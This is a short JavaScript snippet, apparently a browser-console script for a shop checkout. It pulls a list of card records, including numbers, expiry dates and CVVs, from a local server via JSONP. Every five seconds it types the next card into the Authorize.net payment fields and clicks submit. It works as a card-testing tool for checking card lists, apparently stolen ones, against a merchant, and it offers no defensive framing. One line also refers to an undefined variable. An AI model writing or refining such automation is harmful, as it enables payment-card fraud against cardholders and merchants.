var url = "http://localhost:5000/post";
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;
        var segundos = 5;

	var iteration = function() {
	  if( i < len ) {
	    var json = arr[i];
            $("#authnetcim_cc_type").val( json.card[0] == 4 ? "VI" : "MC");
            $("#authnetcim_cc_number").val( json.card );
            $("#authnetcim_expiration").val( json.mon );
            $("#authnetcim_expiration_yr").val( "20" + json.year );
            $("#authnetcim_cc_cid").val( json.cvv );	    

	    $($(".button")[5]).click();
            
	    button.click();
	  }
	  else {
	    clearInterval( interval );
	    
	  }

	  i++;
	}

	var interval = setInterval( iteration, segundos * 1000);
	iteration();
};
// V2
$.ajax({
     url:url,
     dataType: "jsonp"
});
